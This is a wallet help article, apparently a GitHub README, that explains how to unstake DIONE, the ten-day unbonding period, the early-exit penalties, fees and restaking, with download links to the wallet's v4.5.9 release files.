![DIONE Wallet](assets/banner-article.png)

# Unstake DIONE and Wait Out the Unbonding Period

<p align="center">Ten days without a reward</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

Undelegating DIONE starts a 10-day unbonding period before the tokens become spendable. During those ten days the stake earns nothing and cannot be moved. Unstaking early, before consolidation, also carries a penalty of 7%, 6% or 5% depending on timing - so the decision to exit is worth taking deliberately rather than in a hurry.

## What unbonding is for

A bonded stake is part of the chain's security. If a delegation could leave instantly, a validator's backing could vanish between blocks, and the penalty mechanism could not function: there would be nothing left to penalise.

The 10-day window is the chain's answer to that. Your tokens are released on a schedule, and the schedule is the same whether you undelegate at 9 a.m. or midnight.

## The exit, step by step

1. Open the staking section and find your delegation.
2. Choose undelegate and enter the amount.
3. Read the confirmation, including any penalty that applies to your stake at that moment.
4. Sign the transaction - on your hardware device if you use one, through the pairing described in [Connect a Ledger to DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/connect-a-ledger-to-dione-wallet.md).
5. Wait. The tokens show as unbonding rather than spendable.
6. After the period completes, the balance becomes available and can be sent or restaked.

Step three is the one to slow down for. The penalty is applied on the amount, not on the reward, and a stake held for a short period can exit with less than it started. [Calculate DIONE Staking Rewards Before You Delegate](https://github.com/dione-protocol/staking-and-network/blob/main/calculate-dione-staking-rewards.md) runs that comparison for a given amount and stake age.

## How long does unstaking take?

Ten days from the moment the undelegation transaction confirms. That is the published unbonding period, and it does not depend on the amount, the validator or the time of month.

Practically, plan backwards from when you need the funds: ten days plus the time to notice the completion. If you need the money next week, staking was the wrong instrument for that portion.

## Does unstaking early cost money?

It can, and the structure is worth memorising before you delegate:

| When you exit | Penalty |
| --- | --- |
| Within the first month | 7% |
| Under three months | 6% |
| Before consolidation | 5% |
| After consolidation | none |

"Consolidation" is the point at which the stake is treated as fully settled. Exiting before it carries a cost; exiting after it does not. The full treatment, including what consolidation means for rewards already earned, is in [DIONE Staking Minimums and Early-Unstake Penalties](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-minimum-and-penalties.md).

## Should you stake or unstake before consolidation?

The question is arithmetic, not preference. Compare the reward the stake will earn between now and the exit against the penalty that applies now.

If the penalty is 7% and the stake will earn 1% per 30-day period, exiting immediately costs more than several periods of reward. Waiting until consolidation removes the penalty entirely, which is why the normal advice is to decide before delegating rather than after.

That said, a penalty is sometimes the right price. If you need the funds for something more valuable than the penalty, pay it deliberately and move on. What is never right is paying it by accident because the confirmation screen was not read.

## Unstaking, rewards and the fee

Two details trip people up. First, rewards accrued but not claimed are part of the delegation; undelegating does not silently hand them over, so claim before exiting if you want them in the spendable balance. Second, the undelegation is itself a transaction and costs a network fee in DIONE.

That fee is why a wallet staked to the last coin can be stuck: the balance is bonded, and the exit transaction has nothing to pay for itself. Leave a working balance, or receive a small amount before undelegating.

## Restaking after the wait

Once the unbonding completes, the tokens are ordinary balance again and can be delegated afresh - to the same validator or another one. The new delegation starts the cycle over, including the minimum and the unbonding clock.

If the goal was to switch validators because of uptime, this is the route: undelegate, wait, redelegate. There is no instant switch. [Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md) covers the choice itself.

## Planning around the ten days

Three habits make the period painless:

- **Stake only what can stay put for weeks**, not days.
- **Keep a fee balance outside the stake**, so an exit is always possible.
- **Decide the exit before the emergency**, so the penalty is a considered cost rather than a surprise.

None of these is exotic; all three are cheaper than discovering them during a 10-day wait. The wait itself is not shortened by any setting, so it belongs in the plan rather than in the reaction.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

The unbonding view and penalty display come from the app, and a build that is behind can show an exit without its cost. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before undelegating, so the confirmation you read is the current one.

## FAQ

### How long does DIONE staking take to unstake?

Ten days from the confirming transaction. The period is fixed and starts when the undelegation is included in a block.

### What is the DIONE unbonding period?

Ten days. During it the stake earns nothing and cannot be spent.

### What happens if I unstake early?

Before consolidation, an early exit carries 7% within the first month, 6% under three months, or 5% otherwise - and nothing once consolidated.

### Is it better to stake or unstake before consolidation?

Compare the penalty that applies now with the reward the stake would earn by waiting. If the penalty is larger, waiting until consolidation is cheaper.

### Can I restake after unstaking?

Yes, once the unbonding completes the tokens are ordinary balance and can be delegated again, to the same validator or a different one.

The unbonding period is the price of a stake being part of the chain's security, and the penalty is the price of leaving early. [How to Stake DIONE Coin](https://github.com/dione-protocol/staking-and-network/blob/main/how-to-stake-dione-coin.md) covers starting, [DIONE Staking Minimums and Early-Unstake Penalties](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-minimum-and-penalties.md) the penalties in full, and [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md) what accrues during the wait.
